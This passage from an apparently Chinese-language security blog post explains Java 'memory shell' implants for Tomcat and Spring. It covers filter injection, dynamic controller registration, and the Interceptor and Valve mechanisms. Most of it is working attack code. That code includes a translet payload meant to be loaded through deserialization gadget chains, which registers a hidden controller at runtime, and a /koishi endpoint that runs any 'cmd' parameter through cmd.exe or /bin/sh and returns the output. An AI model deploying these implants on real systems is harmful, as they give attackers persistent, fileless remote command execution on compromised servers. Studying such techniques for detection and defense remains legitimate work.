class="string">&quot;context&quot;</span>);</span><br><span class="line">                context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">ApplicationContext</span> <span class="operator">=</span> (ApplicationContext)context.get(servletContext);</span><br><span class="line">                <span class="comment">//获取standardContext</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> ApplicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(ApplicationContext);</span><br><span class="line">                <span class="comment">//获取LifecycleBase的state修改为org.apache.catalina.LifecycleState.STARTING_PREP</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">state</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.util.LifecycleBase&quot;</span>).getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">                state.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">                <span class="comment">//注册filterName</span></span><br><span class="line">                FilterRegistration.<span class="type">Dynamic</span> <span class="variable">registration</span> <span class="operator">=</span> ApplicationContext.addFilter(filterName, <span class="keyword">new</span> <span class="title class_">ShellIntInject</span>());</span><br><span class="line">                <span class="comment">//添加拦截路径，实现是将存储写入到filterMap中</span></span><br><span class="line">                registration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line">                <span class="comment">//调用filterStart方法将filterconfig进行添加</span></span><br><span class="line">                <span class="type">Method</span> <span class="variable">filterStart</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">                filterStart.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                filterStart.invoke(standardContext,<span class="literal">null</span>);</span><br><span class="line">                <span class="comment">//移动filter为位置到前面</span></span><br><span class="line">                FilterMap[] filterMaps = standardContext.findFilterMaps();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (filterMaps[i].getFilterName().equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                        org.apache.tomcat.util.descriptor.web.<span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> filterMaps[i];</span><br><span class="line">                        filterMaps[i] = filterMaps[<span class="number">0</span>];</span><br><span class="line">                        filterMaps[<span class="number">0</span>] = filterMap;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getWriter().write(<span class="string">&quot;TomcatEcho_HalfWithFilter injection successful!\nGo to /koishi with ParamName \&quot;cmd\&quot; for farther operation&quot;</span>);</span><br><span class="line">                state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p><strong>shiro</strong></p>
<blockquote>
<p>在shiro反序列化漏洞的利用中并不能成功，发现request，response的设置是在漏洞触发点之后，所以在触发漏洞执行任意java代码时获取不到我们想要的response。其原因是因为rememberMe功能的实现是使用了自己实现的filter。</p>
</blockquote>
<p><strong>Tomcat10</strong></p>
<p>HttpServletRequest 与 tomcat789 调用的依赖不同</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import jakarta.servlet.*;</span><br><span class="line">import jakarta.servlet.http.HttpServletRequest;</span><br></pre></td></tr></table></figure></div>



<p><strong>Tomcat7</strong></p>
<p>FilterDef 与 FilterMap 在 tomcat8910 中调用依赖不同</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">org.apache.tomcat.util.descriptor.web.FilterDef</span><br><span class="line">org.apache.tomcat.util.descriptor.web.FilterMap</span><br></pre></td></tr></table></figure></div>



<h2 id="六、Spring-Controller-内存马"><a href="#六、Spring-Controller-内存马" class="headerlink" title="六、Spring Controller 内存马"></a>六、Spring Controller 内存马</h2><p><a class="link"   href="https://github.com/wycm/SpringMVC-Demo/blob/master/SpringMVC%E6%BA%90%E7%A0%81%E4%B9%8BController%E6%9F%A5%E6%89%BE%E5%8E%9F%E7%90%86.md" >SpringMVC 部分讲解 和 registerHandlerMethod方法简单总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="SpringMVC初始化过程"><a href="#SpringMVC初始化过程" class="headerlink" title="SpringMVC初始化过程"></a><strong>SpringMVC初始化过程</strong></h3><p>跟着文章思路，自己debug进去看，大概写个流程</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">RequestMappingHandlerMapping#afterPropertiesSet -&gt; </span><br><span class="line">AbstractHandlerMethodMapping#afterPropertiesSet -&gt;</span><br><span class="line">AbstractHandlerMethodMapping#initHandlerMethods -&gt;</span><br><span class="line"><span class="comment">// 从applicationContext中扫描beans，然后从bean中查找并注册处理器方法</span></span><br><span class="line">AbstractHandlerMethodMapping#processCandidateBean -&gt;</span><br><span class="line">AbstractHandlerMethodMapping#isHandler -&gt;</span><br><span class="line"><span class="comment">// isHandler会根据bean来判断bean定义中是否带有Controller注解或RequestMapping注解</span></span><br><span class="line">AbstractHandlerMethodMapping#detectHandlerMethods -&gt;</span><br><span class="line">AbstractHandlerMethodMapping#getMappingForMethod -&gt;</span><br><span class="line"><span class="comment">// 根据handler method方法创建RequestMappingInfo对象</span></span><br><span class="line">AbstractHandlerMethodMapping#registerHandlerMethod -&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong><code>registerHandlerMethod</code>方法简单总结</strong></p>
<blockquote>
<ol>
<li>检查<code>RequestMapping</code>注解配置是否有歧义。</li>
<li>构建<code>RequestMappingInfo</code>到<code>HandlerMethod</code>的映射map。该map便是<code>AbstractHandlerMethodMapping</code>的成员变量<code>handlerMethods</code>。<code>LinkedHashMap``&lt;RequestMappingInfo,HandlerMethod&gt;</code></li>
<li>构建<code>AbstractHandlerMethodMapping</code>的成员变量<code>urlMap</code>，<code>MultiValueMap</code>&lt;<code>String</code>,<code>RequestMappingInfo</code>&gt;。这个数据结构可以把它理解成Map&lt;String,List&gt;。其中String类型的key存放的是处理方法上<code>RequestMapping</code>注解的value。就是具体的<code>uri</code> 先有如下<code>Controller</code></li>
</ol>
</blockquote>
<h3 id="查找过程"><a href="#查找过程" class="headerlink" title="查找过程"></a>查找过程</h3><blockquote>
<p>web容器（Tomcat、jetty）接收请求后，交给DispatcherServlet处理。FrameworkServlet调用对应请求方法（eg:get调用doGet），然后调用processRequest方法。进入processRequest方法后，一系列处理后，在line:936进入doService方法。然后在Line856进入doDispatch方法。在line:896获取当前请求的处理器handler。然后进入AbstractHandlerMethodMapping的lookupHandlerMethod方法。代码如下</p>
</blockquote>
<p><strong>lookupHandlerMethod</strong></p>
<ul>
<li><p>根据lookupPath，也就是请求的uri。直接查找urlMap，获取直接匹配的RequestMappingInfo list</p>
</li>
<li><p>代码里可以看出，匹配的先后顺序是value&gt;params&gt;headers&gt;consumes&gt;produces&gt;methods&gt;custom</p>
</li>
<li><p>当通过urlMap获取不到直接匹配value的RequestMappingInfo时才会走通配符匹配进入addMatchingMappings方法。</p>
</li>
<li><p>在 MappingRegistry.urlLookup 中获取直接匹配的 RequestMappingInfos</p>
</li>
<li><p>如果没有，则遍历所有的 MappingRegistry.mappingLookup 中保存的 RequestMappingInfos</p>
</li>
<li><p>获取最佳匹配的 RequestMappingInfo 对应的 HandlerMethod</p>
</li>
</ul>
<h3 id="Controller-注册进一步学习"><a href="#Controller-注册进一步学习" class="headerlink" title="Controller 注册进一步学习"></a>Controller 注册进一步学习</h3><p><a class="link"   href="https://landgrey.me/blog/12/" >LandGrey’s Blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>综上，可以了解到：每个具体的 <code>DispatcherServlet</code> 创建的是一个 <code>Child Context</code>，代表一个独立的 <code>IoC 容器</code>；而 <code>ContextLoaderListener</code> 所创建的是一个 <code>Root Context</code>，代表全局唯一的一个公共 <code>IoC 容器</code></p>
<p>如果要访问和操作 <code>bean</code> ，一般要获得当前代码执行环境的<code>IoC 容器</code> 代表者 <code>ApplicationContext</code></p>
</blockquote>
<p><strong>技术实现：</strong></p>
<h4 id="1-获得当前代码运行时的上下文环境"><a href="#1-获得当前代码运行时的上下文环境" class="headerlink" title="1.获得当前代码运行时的上下文环境"></a>1.获得当前代码运行时的上下文环境</h4><p>方法一：<code>getCurrentWebApplicationContext</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure></div>



<p>方法二：<code>WebApplicationContextUtils</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br></pre></td></tr></table></figure></div>



<p>方法三：<code>RequestContextUtils</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br></pre></td></tr></table></figure></div>



<p>方法四：<code>getAttribute</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br></pre></td></tr></table></figure></div>

<p><strong>而对于获取上下文来说，推荐使用第三、四种方法。前两种可能会获取不到<code>RequestMappingHandlerMapping</code>实例</strong></p>
<h4 id="2-手动注册-controller"><a href="#2-手动注册-controller" class="headerlink" title="2.手动注册 controller"></a>2.手动注册 controller</h4><p>Spring 2.5 开始到 Spring 3.1 之前一般使用 <code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code> 映射器 ；</p>
<p>Spring 3.1 开始及以后一般开始使用新的 <code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code> 映射器来支持<code>@Contoller</code>和<code>@RequestMapping</code>注解。</p>
<p>当然，也有高版本依旧使用旧映射器的情况。因此正常程序的上下文中一般存在其中一种映射器的实例 <code>bean</code>。又因版本不同和较多的接口等原因，手工注册动态 <code>controller</code> 的方法不止一种。</p>
<p><strong>注:</strong>  <code>@RestController</code>注解缺失会导致500错误、无回显</p>
<h4 id="3-controller的缺点"><a href="#3-controller的缺点" class="headerlink" title="3. controller的缺点"></a>3. controller的缺点</h4><p>在对于存在相关的拦截器的时候，controller内存马就无法进行利用，原因就在于拦截器的调用顺序在controller之前，所以controller不能作为通用的内存马来进行使用。</p>
<h3 id="Spring-Controller-内存马代码"><a href="#Spring-Controller-内存马代码" class="headerlink" title="Spring Controller 内存马代码"></a>Spring Controller 内存马代码</h3><p><a class="link"   href="https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/#%E6%B3%A8%E5%86%8Ccontroller" >Spring 内存马实现 | MYZXCG <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>（一下内存马配合可以加载字节码的 gadget 使用，常见的有 CB1 , CC2 , CC11 , fastjson_Templates 链 ）</p>
<p><strong>KoishiEvilController</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro.vuln.Controller.koishi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.support.RequestContextUtils;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiEvilController</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.example.spring.InjectControl&quot;</span>;</span><br><span class="line">            <span class="comment">//加载com.example.spring.InjectControl类的字节码</span></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             *  加载我们的恶意 Controller 字节码</span></span><br><span class="line"><span class="comment">            * */</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ClassPool.getDefault().get(InjectControl.class.getName()).toBytecode();</span><br><span class="line">            java.lang.<span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">m0</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            m0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            m0.invoke(classLoader, className, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 获取上下文</span></span><br><span class="line"><span class="comment">            * */</span></span><br><span class="line">            <span class="comment">// first</span></span><br><span class="line"><span class="comment">//            WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// second</span></span><br><span class="line"><span class="comment">//            WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// third</span></span><br><span class="line"><span class="comment">//            WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// fourth 从当前request属性中获取org.springframework.web.servlet.DispatcherServlet.CONTEXT, 其中对应的值为 AnnotationConfigServletWebServerApplicationContext</span></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line">            <span class="comment">//WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// fifth</span></span><br><span class="line"><span class="comment">//            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * registerMapping 在 spring 4.0 及以后，可以使用 registerMapping 直接注册 requestMapping ，这是最直接的一种方式 ( 我2.6.6 也能注入进行就是好像会造成页面崩溃，但是不影响命令执行 )</span></span><br><span class="line"><span class="comment">             * */</span></span><br><span class="line">            <span class="comment">//从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">r</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="comment">//通过反射获得自定义controller中唯一的Method对象</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> (Class.forName(className).getDeclaredMethods())[<span class="number">0</span>];</span><br><span class="line">            <span class="comment">//定义访问controller的URL地址</span></span><br><span class="line">            <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/hahahaLaLaLa&quot;</span>);</span><br><span class="line">            <span class="comment">//定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class="line">            <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">            <span class="comment">//在内存中动态注册 controller</span></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, ms, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            r.registerMapping(info, Class.forName(className).newInstance(), method);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>InjectControl</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro.vuln.Controller.koishi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectControl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectControl</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这个类也可以学胡师傅那样，写个 until 专门来存字节码</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/koishi&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">arg0</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">Scanner</span>(p.start().getInputStream())).useDelimiter(<span class="string">&quot;\\\\A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next() : o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>使用 gadget 加载 KoishiEvilController 打到 &#x2F;poc 端口即可</p>
<h2 id="七、Spring-Interceptor-内存马"><a href="#七、Spring-Interceptor-内存马" class="headerlink" title="七、Spring Interceptor 内存马"></a>七、Spring Interceptor 内存马</h2><p>同样推荐参考，拦截器处理原理不再做过多 “誊抄” ，这里只写下代码基本构成</p>
<p><a class="link"   href="https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/#%E6%B3%A8%E5%86%8Ccontroller" >Spring 内存马实现 | MYZXCG <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>定义拦截器必须实现<code>HandlerInterceptor</code>接口，<code>HandlerInterceptor</code>接口中有三个方法：</p>
<ol>
<li>preHandle方法是controller方法执行前拦截的方法<ul>
<li>可以使用request或者response跳转到指定的页面</li>
<li>return true放行，执行下一个拦截器，如果没有拦截器，执行controller中的方法。</li>
<li>return false不放行，不会执行controller中的方法。</li>
</ul>
</li>
<li>postHandle是controller方法执行后执行的方法，在JSP视图执行前。<ul>
<li>可以使用request或者response跳转到指定的页面</li>
<li>如果指定了跳转的页面，那么controller方法跳转的页面将不会显示。</li>
</ul>
</li>
<li>afterCompletion方法是在JSP执行后执行<ul>
<li>request或者response不能再跳转页面了</li>
</ul>
</li>
</ol>
</blockquote>
<h3 id="动态注入Interceptor"><a href="#动态注入Interceptor" class="headerlink" title="动态注入Interceptor"></a>动态注入Interceptor</h3><p>通过上面分析发现，如果把自定义的Interceptor类加入到<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping </code>类的 <code>adaptedInterceptors</code> 属性中即可注册一个拦截器。这个挺好用，在每个页面都会触发，nice中的nice。</p>
<p>内存马代码见我给的项目吧，这里放个效果图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20221111205039773.png"
                      alt="image-20221111205039773"
                ></p>
<p>看这 <code>uri</code> 再怎么离谱、就算不存在都能触发，在每个页面都能触发，可以说是肥肠（非常）好用了，挺有意思</p>
<h2 id="八、Tomcat-Valve-内存马"><a href="#八、Tomcat-Valve-内存马" class="headerlink" title="八、Tomcat Valve 内存马"></a>八、Tomcat Valve 内存马</h2><h3 id="概念提要"><a href="#概念提要" class="headerlink" title="概念提要"></a>概念提要</h3><p>Tomcat 在处理一个请求调用逻辑时，是如何处理和传递 Request 和 Respone 对象的呢？为了整体架构的每个组件的可伸缩性和可扩展性，Tomcat 使用了职责链模式来实现客户端请求的处理。在 Tomcat 中定义了两个接口：Pipeline（管道）和 Valve（阀）。这两个接口名字很好的诠释了处理模式：数据流就像是流经管道的水一样，经过管道上个一个个阀门。</p>
<p>Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 <code>addValve</code> 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1623645442719.jpg"
                      alt="img"
                ></p>
<p>上图的 basic 就是在前文中提到的最基础的 Valve，这个 basic 所属的类是 <code>StandardEngineValve</code></p>
<p>Tomcat 每个层级的容器（Engine、Host、Context、Wrapper），都有基础的 Valve 实现（StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve），他们同时维护了一个 Pipeline 实例（StandardPipeline），也就是说，我们可以在任何层级的容器上针对请求处理进行扩展。这四个 Valve 的基础实现都继承了 ValveBase。这个类帮我们实现了生命接口及MBean 接口，使我们只需专注阀门的逻辑处理即可。</p>
<p>在同一个Pipeline上可以有多个Valve,每个Valve都可以做一些操作，无论是Pipeline还是Valve操作的都是Request和Response。而在容器之间Pipeline和Valve则起到了桥梁的作用。</p>
<p>实在不好理解，可以将其类比于Filter 和 FilterChain 的关系</p>
<p><a class="link"   href="https://www.cnblogs.com/coldridgeValley/p/5816414.html" >Tomcat中容器的pipeline机制 - coldridgeValley - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Valve</span> &#123;</span><br><span class="line">    Valve <span class="title function_">getNext</span><span class="params">()</span>; <span class="comment">//获取下一个阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Valve var1)</span>; <span class="comment">//设置下一个阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">backgroundProcess</span><span class="params">()</span>; <span class="comment">//后台执行逻辑</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request var1, Response var2)</span> <span class="keyword">throws</span> IOException, ServletException;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>; <span class="comment">//是否异步执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>先看<code>Valve</code>接口的方法定义，方法不是很多，这里只介绍<code>setNext()</code>,<code>getNext()</code>。在上面我们也看到了一个<code>Pipeline</code>上面可以有很多<code>Valve</code>，这些<code>Valve</code>存放的方式并非统一存放在<code>Pipeline</code>中，而是像一个链表一个接着一个。当你获取到一个<code>Valve</code>实例的时候，调用<code>getNext()</code>方法即可获取在这个<code>Pipeline</code>上的下个<code>Valve</code>实例。</p>
